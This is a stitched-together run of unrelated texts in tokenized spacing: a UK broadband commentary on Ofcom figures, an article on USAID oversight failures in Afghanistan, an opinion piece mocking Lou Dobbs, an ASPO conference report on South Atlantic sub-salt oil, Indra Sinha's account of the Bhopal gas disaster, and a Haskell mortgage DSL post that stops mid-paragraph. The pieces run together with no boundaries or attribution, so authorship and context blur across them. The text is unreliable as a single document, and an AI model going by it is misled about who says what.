After all , the stats also show that the UK is a leader in accessing social networks on the move - 3.5 million people visited Facebook and its rivals on a mobile in the third quarter of this year .
As a country where you can make money online we 're also ahead of the pack , leading the world in online advertising , and spending more on digital downloads than any other country in Europe .
Mind you at £ 2.24 per head on downloads last year - that 's roughly 10 times what the Italians spent - I do n't think the music industry can relax yet about wallowing in digital profits .
And what about our general connectedness ?
Well Ofcom proudly lays out figures showing we have more broadband connections per household than anyone apart from the Canadians , the best 3g coverage , and the highest level of HSPA connections - that 's souped - up 3g - outside Japan .
Just a minute , I hear you ask , I thought we were in the broadband slow lane .
Well , buried so deep in the report that I had to ask Ofcom to retrieve it for me , is one table that does n't paint quite such a glowing picture .
Figure 4.47 shows the proportion of broadband connections with a headline speed above 8 M bits /s .
In the UK that 's 10 % - whereas in the Netherlands it 's 37 % , in Sweden 33 % , in France 26 % and in Germany 16 % .
That accords with another report issued a week or so back by the OECD .
It showed the UK well down the speed league , and more significantly found that investment in fibre was racing ahead in other countries but had barely started in Britain .
The OECD 's report included some economic analysis which suggested that government investment in faster broadband could be justified even if it delivered just small benefits in areas such as health , electricity , education and transport .
I was pondering some of these issues as I was out walking the dog on a bitter London morning .
While I walked , I listened on my phone to an excellent radio programme about the advance of technology in the last decade , A Googling We Will Go .
The programme streamed via the BBC mobile iPlayer , arrived first over my home wi-fi , and then via a 3g phone network .
But just as it was getting really interesting , about half a mile from my front door the 3g network gave out and the programme stopped .
I had been disconnected from the information superhighway , just a few miles from central London .
What kind of metaphor that provides for the state of Digital Britain I 'm not sure .
But perhaps
Ofcom could have been just a little more cautious in its claims about our status as the champions of the connected world .

WASHINGTON — Understaffing combined with unwieldy budgets on rushed schedules in an active war zone have severely undercut the U.S. Agency for International Development ’s ability to deliver nearly $ 10 billion in aid for development projects in Afghanistan .
A new report by USAID ’s inspector general raises serious questions about how U.S. taxpayer dollars are being spent — or misspent — in Afghanistan on the construction of roads , bridges , schools and other projects .
A dramatic shortage of program officers as well as auditors and investigators and poor security conditions on the ground have all conspired , the 128 - page report concludes , to “ significantly impair ” the objectives of USAID ’s mission , which is to provide economic development and humanitarian assistance in Afghanistan and around the world .
The summary report is based on numerous individual audits and at least 14 active investigations , but it offers few specific details on the fraud , bribery , extortion and kickback schemes which involve at least $ 150 million in taxpayers ’ money .
The failure of USAID to effectively monitor the development projects threatens to undermine the U.S. military ’s new counterinsurgency strategy and troop surge , which is built upon the effective delivery of aid in the struggle against the Taliban for hearts and minds .
“ We are sending too much money , too fast with too few people looking over how it is spent , ” said one official knowledgeable of the USAID inspector general ’s auditing process for the $ 9.4 billion obligated to Afghanistan in the last seven years .
“ We end up not knowing where the money is going , ” added the official , who is pushing for a deeper investigation into alleged abuses by contractors and subcontractors and widespread corruption from the highest levels of the Afghan government to the lowest level of subcontractors in the field .
That push for a further investigation is joined by the House Foreign Affairs Committee which is examining the delivery of foreign aid and the need for more USAID auditors and investigators to be assigned to the field .
The committee 's interest was spurred in part by a special report by GlobalPost that highlighted how USAID funds are going to Afghan subcontractors who are allegedly paying protection money to the Taliban .
Following the GlobalPost report on how subcontractors are purportedly being extorted by the Taliban , the USAID inspector general ’s spokeswoman Dona Dinkler said the agency was conducting a probe into those allegations .
In a recent briefing , she declined comment on the status of what she described as an “ active ” investigation .
The probe comes amid an overall rethinking in Washington of how the restructuring of USAID has left the agency vastly ill - equipped to deal with the challenges it faces , particularly in Afghanistan .
Wendy Chamberlin , the former U.S. ambassador to Pakistan and former assistant administrator in the Asia / Near East bureau of USAID , said , “ The development community has no model for Afghanistan . ”
Ashraf Ghani , the former Afghan finance minister and a presidential candidate , said the system of delivering U.S. aid to Afghanistan was “ broken . ”
Ghani and Chamberlin both called for a fundamental restructuring of the program during a discussion this month at the U.S. Institute of Peace in Washington , D.C .
Many critics in the U.S. and Afghanistan have observed that U.S. President Barack Obama ’s speech last week calling for 30,000 troops was noticeably lacking detail on a civilian strategy for the effective delivery of aid .
By the USAID inspector general ’s own assessment , a lack of security in the war - torn country has made it impossible for U.S. officials to effectively carry out development .
The lack of eyes in the field has made it difficult to substantiate allegations of corruption , including the report by GlobalPost that the Taliban may be running a protection racket in which subcontractors are forced to pay as much as 20 percent of a contract to the Taliban .
Failure to pay , according to several Afghan contractors who spoke to GlobalPost on the condition of anonymity , means employees are targeted for killing or the projects are bombed .
One official knowledgeable of the details of the report said that large contractors in Afghanistan are suspected of hiring private security firms who investigators believe may be the ones paying protection money to local Taliban leaders .
But USAID project chiefs , auditors and investigators are often unable to thoroughly investigate such claims because there is no paper work to substantiate them and because investigators are too frequently trapped inside the U.S. Embassy compound in Kabul , prohibited from going into the field to assess progress due to strict rules governing the movement of U.S. government staff in the war zone .
Obama recently nominated Rajiv Shah to head the agency .
At confirmation hearings earlier this month , Shah recognized deep problems in the agency and said the administration had secured funds to hire more than 300 additional foreign officers , including program officers and auditors .
But Dinkler said , “ An increase of officers will be of little help if they are unable to get out and monitor the projects .
They have to be able to get into the field and the U.S. Embassy has to be a partner in helping the USAID officers to do that . ”
In addition , bloated USAID project budgets are being spent on rushed schedules with too few auditors and project managers in place to watch over them .
According to the report , USAID has fewer than 14 auditors and two investigators , who are based in Manila , the Philippines , and provide oversight to programs in 22 other countries in the region , including Pakistan and Afghanistan .
Now there is only one auditor and one investigator on the ground in Afghanistan , Dinkler said , although USAID says they will soon be adding three more staff to that team .
The report offers “ investigative summaries ” in which it describes some successes by USAID in thwarting corruption and finding savings , but it offers scant details on these cases .
Leading experts with years of experience in delivering development aid to Afghanistan have told GlobalPost that the most recent individual audits and investigation summaries are more forthright than most , but still offer a glimpse at only the tip of the iceberg of corruption and misspending .
USAID was founded under President John F. Kennedy and in the late 1960s had staffing levels that reached 17,500 employees .
By 2005 , that number had shrunk to just 2,400 , according to research by Middlebury College Professor Allison Stanger .
As a result , USAID is increasingly reliant on a web of contractors and subcontractors to deliver foreign aid .
It 's become " a check - writing agency , " said U.S. Sen .
Patrick Leahy ( D - Vt. ) , chairman of an appropriations panel that allocates foreign aid .
Andrew Wilder , who worked for 10 years on the delivery of aid in Pakistan and Afghanistan for Mercy Corps , the International Rescue Committee and Save the Children , is an an aid effectiveness expert .
Discussing overall US development assistance in Afghanistan , Wilder observed that the US government is “ recklessly pouring money into Afghanistan with perverse incentives . ”
He said too many of the projects have budgets of $ 50 million and sometimes as high as $ 100 million and insufficient staff on hand to monitor the contracts .
He pointed to the successes of smaller projects , such as those coordinated under the National Solidarity Program , funded by the World Bank and a host of other donors , in which $ 20,000 grants are distributed in coordination with village elders .
“ The big contracts become faceless and more open to corruption .
They tend to have little or no connection to the community , ” explained Wilder , who is now a professor at Tufts University heading up research into the effective use of aid .
Referring to projects with budgets that run into the tens of millions , he added , “ It ’s hard to spend that kind of money ” effectively and accountably .
“ There is a reckless process that rushes to spend … and it is based on perverse incentives for spending the money .
They [ USAID ] look at burn rates that are high as a favorable thing , " he said , without sufficient attention to their actual impact .
“ We should spend money where we have oversight capacity to spend effectively .
The needs of Afghanistan are great , but we ca n’t program delivery of aid based on need , we have to program delivery of aid based on the capacity to effectively deliver that aid , ” Wilder added .
There are no easy solutions to the problem .
For years , Washington , particularly under the leadership of President George W. Bush , pushed for a system known as the Partner Vetting System , which calls for all subcontractors to be fully vetted .
A pilot program is underway in Gaza in an effort to prevent aid from going to projects affiliated with Hamas .
The approach is practical in theory , according to Paul O’Brien , who has spent five years in Afghanistan as director of aid effectiveness for Oxfam America , but in practice it can severely inhibit the delivery of aid .
“ It has a chilling effect on the way NGOs do business and the ability of local partners to work with NGOS .
It would shut down the system , ” O’Brien said .
He warned that amid the challenges to an unwieldy bureaucracy the tendency has been to turn to private contractors as they are liberated from many of the rules of regulation that are imposed on contracts directly managed by USAID .
That is a process that also can be perilous , he said .
That ’s because in the private sector , where companies are seeking to maximize profit , grant management officers who should be managing no more than $ 10 million projects are often being put in charge of $ 50 million projects .
The severe understaffing on these projects creates ripe conditions for corruption and waste .
O’Brien said , “ The real problem is not the smaller amounts of money being wasted through fraud and abuse , but the huge amounts of money being lost due to a lack of focus on a development plan .
The metric has been delivering aid and goods and services , and not effective development .
We have to come up with a way to focus on development that works . ”
Wilder said the best way to do that is to live by a simple axiom : less is more .
Smaller and more effective projects , he said , are an important way to cut out corruption and deliver much - needed aid to the country .
The large - scale , profligate spending of USAID can in fact be counterproductive to the U.S. effort in Afghanistan , according to Wilder .
“ The current strategy of aid in Afghanistan is built around wishful thinking , an assumption that big aid has a benefit , ” he said , hastening to add , “ There is remarkably little evidence that aid has a stabilizing impact .
And there is some argument that it may in fact have a destabilizing impact . ”
He said large , unaudited aid projects can often pit tribes against each other and line the pockets of corrupt warlords and give them a tighter grip on power .
All of that , he said , can serve to disrupt local balances of power and increase instability in the country .
Wilder said , “ It is not necessarily true that aid wins hearts and minds .
For something so fundamental to our overall counter - insurgency strategy , we are very uncritical of the central assumption in that strategy . ”

I have three stuffed animals at home that I hide when I expect visitors .
( Guys do n’t do stuffed animals . )
But my fuzzy critters serve a purpose .
Four years ago , I destroyed my living room TV set by throwing a beer bottle at it in anger and frustration .
I had been watching Lou Dobbs .
So , for years , I have been throwing stuffed animals at Lou instead of beer bottles .
But now I need throw them no more .
Lou no longer haunts my 7 p.m. viewing .
He quit his CNN program in a multi-syllabic huff this week .
CNN ’s venerable , respected chief national political correspondent , John King , will take over in January .
I ’m sure I wo n’t have to throw stuffed animals at Mr. King .
But I once considered Lou venerable and respected .
He ’s a Harvard grad , y’know , a self - touted intellectual giant in matters of finance and economics .
That ’s why I began watching him years ago .
I learned from him things I did not know .
But for the past few years ,
Lou has only taught me the face of intellectual arrogance , bigotry , and unexceptional reporting masquerading as “ advocacy . ”
Lou , he of the annual salary variously estimated between $ 5 million and $ 10 million , has come to fancy himself as a champion of the middle class .
Mr. King , as host of CNN ’s “ State of the Union , ” has traveled each week to a different state — 44 so far — to sit down with the middle class in their diner , pubs , and livingrooms .
Can you remember — or imagine —
Lou doing the same ?
Aside from his carefully staged , perfectly lit , orchestrated “ town hall ” meetings at which the middle class had to meet Lou on his turf , not theirs ?
When he quit , he lamented the “ partisanship and ideology ” permeating national politics .
He did not or could not view his own brand of divisive opinionating as just another form of partisanship .
CNN , I suspect , is glad to see Lou depart despite 27 years ’ of mostly worthy service .
CNN ’s president , Jonathan Klein , larded the cable network ’s own news story with bombastic paeans for Lou :
For decades ,
Lou fearlessly and tirelessly pursued some of the most important and complex stories of our time , often well ahead of the pack .
…
With characteristic forthrightness , Lou has now decided to carry the banner of advocacy journalism elsewhere .
So why ’d Lou leave ?
Was it “ extremely amicable , ” as Mr. Klein said ?
Or was his ill - reported “ advocacy journalism ” wearing thin on a network that had begun to position itself as centrist , parked between MSNBC on the left and Fox News Channel on the right ?
Or , more bluntly , did Lou not pull in sufficient ad revenues to offset his high salary ?
( And he complained about Wall Street salaries ?
Sheesh . )
By June , Lou ’s ratings had shrunk to unacceptable levels .
His TV program had been drawing only 650,000 viewers , and only about 180,000 were from that advertiser - favored , 25 - to - 54 demographic .
Lou has championed the movement opposing illegal immigration .
That ’s his signature issue following his self - admitted radicalization following the terrorist attacks of Sept. 11 .
When he did not appear in any way , shape or form on CNN ’s “ Latino in America , ” it became clear he was a goner at the network .
Lou says he ’s leaving because
some leaders in media , politics and business have been urging me to … engage in constructive problem - solving , as well as to contribute positively to a better understanding of the great issues of our day .
And to continue to do so in the most honest and direct language possible .
Right .
But how ?
Some pundits conjecture he ’ll seek public office .
Senator Lou ?
Hardly .
Can you imagine Lou , who is wealthy and self - righteous , hitting the campaign trail and pressing the flesh of that middle class with whom he rarely mingles ?
Can you imagine him dialing for dollars — raising the money to run for office ?
He ’d find that demeaning and beneath him .
And he ’s hardly likely to self - finance .
Lou wo n’t be entering politics .
He does not like being held accountable by any one , whether individual , corporate , or political , for what he says and does .
He wants freedom to act without consequence .
Nor does he have the temperament to make the deals and compromises all politicians must .
Will he move on to Fox ?
Doubtful .
Would he view his brand of intellectually arrogant elitism an ill fit for the likes of a network that many argue is anything but intellectual ?
Probably .
And he certainly wo n’t bury himself in a conservative think tank .
He ’d have to submerge his ego .
Lou likes money .
Lou likes fame .
Lou likes being the center of a self - created universe .
Note that his own website touts him as “ Mr. Independent . ”
He likes that tag .
Perhaps Lou wants to be Rush .
Lou has a nationally syndicated radio program , “ The Lou Dobbs Show , ” launched a year and a half ago by United Stations Radio Networks .
It ’s carried on 400 stations and reaches about 5 million listeners .
But conservative talker Rush Limbaugh has the top-rated talk show , reaching more than 14 million listeners .
Lou is eighth in national radio ratings , behind mostly conservative rabble rousers I ’ll bet he considers his intellectual inferiors .
Then there ’s the money :
In 2006 , Rush signed an eight - year contract grossing $ 400 million , about $ 50 million a year .
Do n’t forget his $ 100 million signing bonus .
Do you think Lou might find that kind of money attractive ?
Sure , but Lou has also seen the attention centered on Rush .
By politicians .
By presidents .
By pundits .
By the powerful .
By the proletariat .
That ’s Rush ’s world .
Lou wants to shoulder him aside .
But his CNN gig was not going to get him there .
Bye , bye , Lou .
And thanks : I can now buy a new TV .

At the end of the first day of the ASPO conference in Denver , we were treated to a fantastic presentation on the oil potential of the sub - salt basins on the margins of the South Atlantic Ocean given by Dr Marcio Mello who presented the evidence for a half trillion barrels of reserves in this new frontier province .
So has a new Saudi Arabia been found ?
Marcio Mello is president of HRT Petroleum , a Brazillian geological services company .
Dr Mello's talk began with some background to the Tupi discovery in the Santos Basin , Brazil , and went on to extrapolate the geological and petroleum systems of Tupi to basins off southern Africa , the Amazon Basin , The Gulf of Mexico and The Congo Basin .
Dr Mello explained how the discovery of " diamondoid " structures in oil at shallow depth in Brazil gave evidence for mixing two types of petroleum , one that must have been formed at great depth below the Salt that blankets this basin .
He had for many years tried to persuade Petrobras to drill deep , into the sub - salt strata , which of course they did eventually do leading to the discovery of Tupi .
The Tupi Field occurs in limestone reservoir at extraordinary depths of around 6000 meters beneath a salt layer that is around 2000 m thick .
At such depths , temperatures would normally be too high for oil to survive but the secrets here are a combination of deep water and the conducting character of the salt which results in hot but tollerable temperatures at these great depths where the drill bit has proven intermediate grade crude oil to exist .
The geological story
The story starts during the Early Cretaceous when the continents of S America , Africa , Australia and Antarctica were joined in a supercontinent called Gondwanaland .
A series of deep lakes formed along an axis of rifting that would eventually lead to the opening of the Atlantic Ocean .
This is a tectonic setting similar to the East African rift valley .
High levels of organic productivity lead to organic rich shales forming on the Lake bottom that were destined to become the source rocks .
With progressive rifting the sea eventually invaded the rift valley lakes and an elongate shallow sea formed in which limestones were deposited .
This is a setting not unlike the Red Sea today .
The limestone , sitting on top of the organic shales , were destined to become the reservoir rocks .
And then something unusual must have happened to limit open access to the oceans , and with high evaporation rates , saline water built up in this shallow sea leading to the deposition of a very thick layer of salt , which formed an extensve seal , across the seabed .
The perfect geological storm
With progressive rifting , S America was eventually separated from Africa and the Atlantic Ocean began to open .
The rift valley strata of black shale , limestone and salt was buried beneath sand and mud eroding off the newly formed continental margin and was buried to great depth , heated and squeezed .
Eventually the source rocks matured and oil formed but with the extensive layer of salt above it could not escape and gathered instead in the limestone reservoirs that have now been drilled and called Tupi , Jupiter , Iara and Guara .
A mirror image in Africa ?
When the continents split apart , roughly half the rift basin strata followed S America and half followed Africa .
Dr Mello then went on to speculate that a mirror image of the Santos Basin may exist on the African side .
I believe it has already been identified on seismic .
Somewhat higher heat flows on this side would likely mean a gas and condensate play instead of oil .
Mapping oil seeps using satellites
Dr Mello also presented data acquired by satellites that could identify and map ocean surface oil slicks , formed by oil escaping from sub - surface reservoirs .
Mapping these slicks with time allows the source on the seabed to be located and if this lies above a geological structure this may suggest a mature petroleum system below .
A case study from the Cantarell Field was presented along with prospects mapped in this way from the deep water in the Gulf of Mexico .
500 billion barrels of reserves ?
Dr Mello's talk was extremely slick and enjoyable .
One has to remember he is a salesman as well as a scientist , accustomed to selling his ideas and reports to the oil industry .
He speculated that the sub - salt basins on the margins of the S Atlantic together with the Amazon and Congo basins may contain 500 billion barrels of oil .
So is this our oil supply problems solved ?
If he is right , then another Saudi Arabia may be found , but in much more hostile environment .
Cautionary notes
With a world economy intolerant of oil price > $ 80 , there is a major question whether these ultra deep fields can be developed and produce oil at a price the world can afford .
In the future , when our economy has adapted to a higher energy price environment and we are desperate for oil , then it seems likely that they will be developed one day .
Indeed Tupi is currently on an extended well test .
Oil seeps sometimes are and sometimes are not good indicators of oil fields below .
Explorationists need to be optimistic and there will ineviatbly be many disappointments in the years ahead .
Much of Dr Mello 's presentation was extrapolation and speculation , but I will not be surprised to hear about a string of new discoveries from these plays in the decades ahead .
500 billion barrels will likely prove to be a wild over - estimate , but I do suspect that oil from the sub - salt will help soften the decline curve of future global oil supplies .
There is the ever present question of ERoEI , and Professor Hall was on hand to volunteer his services in exchange for a few barrels or their proxy - $ $ .
Personally , I 'd guess that ERoEI will not be an issue here since 20,000 bbls per day from single wells represents a very high flow of energy .
It will be many years before significant production volumes comes from the Santos Basin and this will not impact near term oil supply issues until at least 2020 .
Finally , Dr Mello seemed very surprised to learn during the Q&A that 500 billion barrels was just 15 years global oil supply .
Indra Sinha , who was Booker - nominated for his book on the Bhopal disaster , explains why the gas leak that killed 20,000 people 25 years ago – and continues to create health problems for countless more – is still a national scandal
Under the volcano
" Wake up people of Bhopal , you are on the edge of a volcano ! "
In September 1982 , Bhopali journalist Raj Keswani wrote a terrifying story , the first of a series of articles , for the city 's Jansatta daily .
Bhopal was about to be annihilated .
" It will take just an hour , at most an hour - and - a - half , for every one of us to die . "
Keswani's information came from worried staff at the Union Carbide factory , where a worker , Ashraf Khan , had just been killed in a phosgene spill .
The first world war gas was used in the production of MIC ( methyl - isocyanate ) , a substance 500 times deadlier than hydrogen cyanide , and so volatile that unless kept in spotless conditions , refrigerated to 0C , it can even react explosively with itself .
Cooling it slows reactions , buys time , but MIC is so dangerous that chemical engineers recommend not storing it at all unless absolutely necessary and then only in the tiniest quantities .
In Bhopal it was kept in a huge tank , the size of a steam locomotive .
Far from the shining cathedral of science depicted in Union Carbide adverts , the Bhopal factory more closely resembled a farmyard .
Built in the 70s to make pesticides for India 's " green revolution " , a series of bad monsoons and crop failures had left it haemorrhaging money .
Union Carbide bosses hoped to dismantle and ship the plant to Indonesia or Brazil , but finding no buyers , went instead on a cost - cutting spree .
Between 1980 and 1984 the workforce was halved .
The crew of the MIC unit was cut from 12 to six , its maintenance staff from six to two .
In the control room a single operator had to monitor 70 - odd panels , indicators and controls , all old and faulty .
Safety training was reduced from six months to two weeks – reduced in effect to slogans – but as the slogans were in English , the workers could n't understand them .
By the time Keswani began his articles , the huge , highly dangerous plant was being operated by men who had next to no training , who spoke no English , but were expected to use English manuals .
Morale was low but safety fears were ignored by management .
Minor accidents happened routinely but were covered up .
There were so many small leaks that the alarm siren was turned off to avoid inconveniencing the neighbours .
A Union Carbide memo boasted of having saved $ 1.25 m , but said that " future savings would not be so easy " .
There was nothing left to cut .
Then bosses remembered the huge tank of MIC .
They turned off its refrigeration to save freon gas worth $ 37 a day .
A 1982 safety audit by US engineers had noted the filthy , neglected condition of the plant , identified 61 hazards , 30 critical , of which 11 were in the dangerous MIC / phosgene units .
The audit warned of the danger of a major toxic release .
Safety was duly improved at Union Carbide 's other MIC plant in West Virginia .
In Bhopal , where six serious accidents had occurred – one fatal , and three involving gas leaks – nothing was done .
If safety was ignored inside the plant , Union Carbide had no plan at all for the surrounding densely packed neighbourhoods .
As the situation worsened , factory staff , fearing for their own lives and those living nearby , put up posters warning of a terrible danger .
Keswani wrote begging the chief minister of Madhya Pradesh to investigate the factory before Bhopal " turns into Hitler 's gas chamber " .
His sensational style , perhaps , caused him to be ignored .
His final article , " We are all about to be annihilated " , appeared just weeks before the gas disaster .
As night fell on 2 December 1984 , none of the factory 's safety systems was working .
The vent gas scrubber lay in pieces .
The flare tower was undersized .
The siren stayed silent .
Years later – too late for the thousands who would now die in unimaginably hideous ways – a prosecuting attorney would say that Union Carbide had demonstrated a " depraved indifference to human life " .
' That night '
Safety slogans at the Union Carbide factory were in English - not a language all the workers spoke
3 December 1984 , just after midnight .
Death came out of a clear sky .
From Union Carbide 's factory , a thin plume of white vapour began streaming from a high structure .
Caught by the wind , it became a haze and blew downwards to mingle with smoke coming from somewhere nearer the ground .
A dense fog formed .
Nudged by the wind , it rolled across the road and into the alleys on the other side .
Here houses were packed close , shoddily built , with ill - fitting doors and windows .
Those within woke coughing , their eyes and mouths on fire .
Across the city countless women were saying , " Hush darling , it 's only someone burning chillies .
Go back to sleep . "
Survivors ' leader Champa Devi Shukla says , " We woke with eyes crying , noses watering .
The pain was unbearable .
We were writhing , coughing and slobbering froth .
People just got up and ran in whatever clothes they were wearing .
Some were in their underclothes , others wore nothing at all .
It was complete panic .
Among the crowd of people , dogs , and even cows were running and trying to save their lives and crushing people as they ran .
All climbed and scrambled over each other to save their lives . "
In the stampedes through narrow alleys many were trampled to death .
Some went into convulsions and dropped dead .
Most , struggling to breathe as the gas ripped their lungs apart , drowned in their own body fluids .
Aziza Sultan had two young children and was pregnant with her third .
When the panic began , her entire family ran out of their house .
They were in night clothes and it was bitterly cold , but nothing mattered except to run .
Outside in the lane , it appeared that a large number of people had passed that way .
Shoes , slippers and shawls were strewn about .
A thick gas cloud enveloped everything , reducing the streetlights to brown pinpoints .
" In the panic , " Aziza recalls , " lots and lots of people were running , screaming for help , vomiting , falling down unconscious .
Children were wrenched from their parents ' grasp .
Their cries were heartbreaking .
I was terrified of losing my children .
I was carrying my baby son Mohsin .
My daughter Ruby was holding on to my kurta , she did not once let go .
We had gone about 500 metres when my father - in law spotted a truck and told us to climb aboard .
We could n't , but he was tall and strong so he got in .
In the confusion , instead of lifting up his grandson , he grabbed another little boy who was running around on his own .
My mother - in - law was vomiting .
She was a heart patient and Hamidia hospital was still two kilometres away , much of it uphill .
Soon Mohsin was being sick on me .
Ruby was also vomiting .
We all fell on the ground .
I had a miscarriage right there in the middle of the street , my body was covered with blood . "
At least 8,000 people died on " that night " .
Half a million were injured .
In the years since , as more people died of their injuries and illnesses caused by inhaling the gas , the death toll has risen above 20,000 .
The long - predicted gas leak at Union Carbide was , and remains , the worst industrial disaster in history .
The aftermath
Thirteen - year - old Salman , who lives near the Union Carbide factory , is blind , and has other serious health problems
Light came to city streets full of corpses sprawled in the agonised poses in which death had found them .
They lay in heaps , limbs twisted , faces contorted .
In some places the dead were so many that it was impossible to walk without stepping on them .
These were scenes from an apocalypse .
The sun came up on choking , blinded people making their way to the hospitals .
Some , desperate to relieve the agony in their eyes , were washing them in sewage water from the open drains .
The hospitals were full of the dying and doctors did not know how to treat them because they did not know which gas or gases had leaked , and Union Carbide would not release the information , claiming it was a " trade secret " .
A quarter of a century later , Union Carbide and its owner , the Dow Chemical Company , which acquired it in 2001 , still refuse to publish the results of studies into the effects of MIC .
With or without these studies , 25 years of suffering prove that mass exposure to MIC destroys bodies , minds , families and a whole society .
Abdul Mansuri speaks for thousands .
" My breathing problems started after the gas and got worse and worse .
I can truthfully say that I have never had a day's health , or a day without pain , since ' that night ' . "
For some the pain , physical , mental , emotional , has been too much .
Kailash Pawar was a young man .
" My body is the support of my life , " he said .
" When my breathing is normal I feel like living .
But when it becomes heavy , thinking stops and absolute pain takes over .
I have become worthless . "
He was still in his 20s when he doused himself in kerosene and struck a match .
Today in Bhopal , more than 100,000 people remain chronically ill .
The compensation paid by Union Carbide , meant to last the rest of their lives , averaged some £ 300 a head : taken over 25 years that works out at around 7 p a day , enough perhaps for a cup of tea .
Over the years the survivors have received little medical help .
Being mostly very poor , they were often treated rudely .
Government doctors would refuse to touch them .
They were theoretically entitled to free treatment but were prescribed expensive drugs they did not need and which in some cases actually harmed them .
In 1994 the Indian government , eager to put the gas leak behind it , shut down all research studies into the effects of the gas , just as new epidemics of cancers , diabetes , eye defects and crippling menstrual disorders were beginning to appear .
Abandoned by all who had a duty of care , the survivors decided to open their own clinic .
In 1994 , an advertisement appeared in the Guardian , launching the Bhopal Medical Appeal .
The generous response of this newspaper 's readers and others enabled the survivors to buy a building , hire medical staff and begin training .
In 1996 the Sambhavna Clinic opened its doors , offering survivors a combination of modern medicine , ayurvedic herbal treatments , yoga and massage .
Consultations , treatments , therapies , medicines and post - treatment monitoring are all absolutely free .
The water poisoning
When the monsoon rain falls in Bhopal , it seeps through buried waste before filling up and polluting the underground resevoirs
After the night of horror , the factory was locked up .
Thousands of tonnes of pesticides and waste remained inside .
Union Carbide never bothered to clean it .
The chemicals were abandoned in warehouses open to wind and rain .
Twenty - four monsoons have rusted and rotted the death factory .
The rains wash the poisons deep into the soil .
They enter the groundwater and seep into wells and bore pipes .
They gush from taps and enter people 's bodies .
They burn stomachs , corrode skin , damage organs and flow into wombs where they go to work on the unborn .
If babies make it into the world alive , the poisons are waiting in their mothers ' milk .
Atal Ayub Nagar is a slim strip of housing sandwiched between Union Carbide 's factory wall and the railway line .
It used to have no handpumps and fetching water meant a trek to a well in Shakti Nagar , half a mile to the south .
People clubbed together to install two handpumps .
At first the water seemed OK , but then oily globules began appearing .
The water acquired a chemical smell , which grew gradually worse .
A private Union Carbide memo , obtained via a US court case , reveals that as far back as 1989 the company had tested soil and water inside the factory .
Fish introduced to the samples died instantly .
The danger to drinking water supplies was obvious , but Carbide issued no warnings .
Its bosses in India and the US watched silently as families already ruined by their gases drank , and bathed their kids in poisoned water .
In Atal Ayub Nagar , many damaged babies were being born .
The situation did not improve after the state government took possession of the site in 1998 .
The following year , when Greenpeace was testing soil and water around the factory , it visited this place and found carbon tetrachloride in one of the handpumps at levels 682 times higher than US Environmental Protection Agency ( EPA ) limits .
People drank this water , washed their clothes and bathed in it .
In August 2009 , a sample of water from the same handpump was analysed by a Greenpeace laboratory in the UK .
Carbon tetrachloride was found at 4,880 times the EPA limit .
In the last decade , the water has become seven times more poisonous .
Rehana is a nine - year - old from Atal Ayub Nagar .
She was born without a left thumb , her growth is retarded , her mind is weak and she has n't the strength to go to school .
Rehana 's vision is not good , she 's plagued by rashes and is constantly breathless .
Her father sadly asks , " Why was fate so cruel to our poor child ? "
Why was fate so cruel ?
The factory was abandoned by Union Carbide , who did not clean it out after the accident
Long before " that night " there had been troubling rumours , mysterious deaths of cattle grazing near the factory .
Babulal Gaur , a Bhopal lawyer , mediated a settlement between Union Carbide and the aggrieved farmers .
In 2004 , Gaur became a minister in the local BJP government and to him fell the duty of caring for the city 's gas survivors .
He told the Christian Science Monitor that the Union Carbide factory had contaminated the groundwater , and complained that the previous Congress government had tried to hush the matter up .
In May 2004 , India 's Supreme Court ordered the state to supply clean water to the poisoned communities .
Gaur 's government ignored this order .
A year passed and a group of women and children went to the government offices to ask why nothing had been done .
They were savagely beaten , punched and kicked by police .
Weeks later Gaur , by now promoted to chief minister of Madhya Pradesh , announced an ambitious £ 120 m plan to beautify the city with ornamental fountains and badminton courts .
To mark the 25th anniversary of the gas leak , Gaur , demoted to Bhopal gas tragedy relief and rehabilitation minister , announced that he would open the derelict factory site to the public .
There was no water contamination , he said , echoing Indian environment minister Jairam Ramesh , who , with curious naivety , told journalists that he had handled some waste and not become ill .
A cynic remarked that this was like touching a cigarette and saying , " Look , I have n't got lung cancer . "
Denying that contamination exists clearly serves the company 's interests .
No doubt it is mere coincidence that the Dow Chemical Company , has made at least one donation to Gaur 's party , the BJP .
This sordid little tale is itself an echo of the bigger machinations at the centre , where Dow has been trying to twist the arm of Manmohan Singh 's Congress government into letting it off the Bhopal hook in return for a billion - dollar investment in India .
When people ask , " Why is the disaster continuing ?
Why has the factory not been cleaned ?
Why have Union Carbide and Dow not faced justice ? " , the answer is this : Union Carbide 's victims are still dying in Bhopal because India itself is dying under the corrupt and self - serving rule of rotten leaders .
Indra Sinha is the author of Animal 's People , a novel based on the Bhopal disaster .

How to Make Homemade Cough Drops [ WikiHow ]
I recently got fed up trying to understand my mortgage using excel .
After twenty minutes guddling with cells and individual values , I felt the need to create higher - level abstractions such as “ mortgage ” and “ payment strategy ” .
I also wanted to create a list of possible repayment strategies and easily compare them to see how it affects the loan duration and total interest payed .
This is possible in excel , but no fun .
So , fast - forward to the end of an evening ’s hacking with Haskell .
I now have hmortgage , a EDSL for expressing payment strategies and code which will expand out a mortgage into monthly steps , like this :
We are looking at loan of £ 1000.00 at 5.0 % over 10y , which has required monthly payment of £ 10.58 Baseline : Total interest : £ 272.97 Total payments : £ 1272.97 Duration=10y 1 m Overpayment scenario " 2 pm , 200 initial " : Total interest : £ 132.09 Total payments : £ 1132.09 Duration=6y 3 m Compared to baseline : interest=£ - 140.88 , payments =£-140.88 , duration= - 3y 10 m
For month 1 , balance : £ 1000.00 -> £ 791.58 ( interest : £ 4.16 , payment : £ 212.58 )
For month 2 , balance : £ 791.58 -> £ 782.29 ( interest : £ 3.29 , payment : £ 12.58 ) For month 3 , balance : £ 782.29 -> £ 772.96 ( interest : £ 3.25 , payment : £ 12.58 ) For month 4 , balance : £ 772.96 -> £ 763.60 ( interest : £ 3.22 , payment : £ 12.58 )
ie . if you overpay by £ 2 each month , and pay an initial lump sum of £ 200 , you ’ll save about £ 140 overall and will repay the mortgage nearly 4 years early .
There ’s a few points of haskelly interest in this code , mostly inspired by stuff I read a few years ago – behaviors in FRP , and SPJ ’s “ composing contracts ” paper .
Combinators for payment strategies
I have a few primitive payment strategies , which can be combined into more complex strategies :
monthly PaymentsOf ( 100 Pounds )
lumpSumOf ( 100 Pounds )
lumpSumOf ( 100 Pounds ) `after` ( 1 Year )
monthly PaymentsOf ( 100 Pound ) +. ( lumpSumOf ( 100 Pounds ) `after` ( 1 Year ) )
Shallow embedding of DSL
The dsl is a shallow embedding ; it represents the monthly payment plan as a function from month - number to the payment amount , ie .
Integer -> Currency .
There ’s a problem with this approach – the only thing you can do with a function is apply it to some arguments .
